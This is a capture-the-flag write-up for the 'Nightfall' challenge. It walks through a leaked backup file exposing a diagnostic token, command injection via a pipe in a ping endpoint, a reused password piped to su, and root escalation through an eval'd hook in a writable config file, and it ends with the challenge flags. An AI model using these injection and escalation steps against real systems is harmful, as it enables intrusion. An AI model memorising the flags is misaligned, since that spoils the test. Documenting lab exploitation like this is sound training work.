> **Solved and written by** Hrishikesh (`hrishikesh`) · **Team** Cyfer Trace · **Submitted** Oct. 23, 2026, 2:19 p.m.
>
> **Official challenge:** Nightfall · **Category:** Multi · **Difficulty:** Hard · **Points:** 200 · **Solves:** 188
>
> This writeup was contributed by the named teammate for the Cyfer Trace archive. It is not personal work by Ishant Choudhary. Light formatting and file links were added here; the technical content is the author's.

---

# Nightfall CTF7 Write-up

## Target

The assigned target was:

```text
http://2.31.70.16:8080/
```

The objective was to retrieve both `user.txt` and `root.txt`.

## 1. Web Enumeration

The web service identified itself as the Nightfall Depot Portal:

```text
Server: nginx
X-Powered-By: Depot-Portal/1.4.2
```

The login page did not reveal a useful direct authentication path. I checked
`robots.txt`, which disclosed a development backup directory:

```text
http://2.31.70.16:8080/robots.txt
```

Its contents included:

```text
User-agent: *
Disallow: /dev-backup/
```

Browsing the directory revealed an exposed backup file:

```text
/dev-backup/app.py.bak
```

## 2. Recovering the Diagnostic Token

The backup file was returned as ASCII character codes. Decoding those values
revealed the old application source and the token used by the internal
diagnostic endpoint:

```python
DIAG_TOKEN = "d3p0t-d14g-7f3a9c"

@app.route("/internal/diag", methods=["POST"])
def diag():
    if request.headers.get("X-Depot-Token", "") != DIAG_TOKEN:
        abort(403)
    target = request.form.get("target", "")
    for bad in [";", "&", "`", "\n", "\r"]:
        target = target.replace(bad, "")
    cmd = "ping -c 1 -W 1 " + target
    out = subprocess.run(cmd, shell=True, capture_output=True, text=True,
                         timeout=10)
    return Response(out.stdout + out.stderr, mimetype="text/plain")
```

The endpoint was vulnerable to command injection because shell metacharacters
such as `|` were not filtered.

Example request:

```powershell
$headers = @{ "X-Depot-Token" = "d3p0t-d14g-7f3a9c" }
Invoke-WebRequest `
  -Method Post `
  -Uri "http://2.31.70.16:8080/internal/diag" `
  -Headers $headers `
  -Body @{ target = "127.0.0.1 | id" }
```

This executed commands as `www-data`.

## 3. Initial Foothold and User Flag

Reading the application configuration through the diagnostic command execution
exposed database credentials:

```text
DB_USER = "depot"
DB_PASSWORD = "Autumn#Depot2024!"
```

The configuration also noted that the `nightfall` service account reused the
same password for interactive login.

Using the command injection to run a command as `nightfall`:

```sh
echo 'Autumn#Depot2024!' | su - nightfall -c 'cat /home/nightfall/user.txt'
```

The user flag was:

```text
crest{r3us3d_cr3ds_0p3n_th3_d00r}
```

## 4. Privilege Escalation

As `nightfall`, the account had a passwordless sudo rule for the maintenance
helper:

```text
(root) NOPASSWD: /usr/local/bin/nf-maintenance
```

The helper sourced this configuration file:

```text
/etc/nightfall/maintenance.env
```

The file was writable by the `maint` group, and `nightfall` belonged to that
group. The helper evaluated the optional `POST_HOOK` value as root:

```bash
CONF=/etc/nightfall/maintenance.env
[ -r "$CONF" ] && . "$CONF"

if [ -n "$POST_HOOK" ]; then
    eval "$POST_HOOK"
fi
```

This allowed the maintenance environment to be changed to:

```text
POST_HOOK='cat /root/root.txt'
```

Running the allowed helper then printed the root flag:

```sh
sudo -n /usr/local/bin/nf-maintenance
```

The root flag was:

```text
crest{s0urc1ng_a_wr1t4bl3_3nv_as_r00t}
```

## Flags

| File | Flag |
|---|---|
| `user.txt` | `crest{r3us3d_cr3ds_0p3n_th3_d00r}` |
| `root.txt` | `crest{s0urc1ng_a_wr1t4bl3_3nv_as_r00t}` |
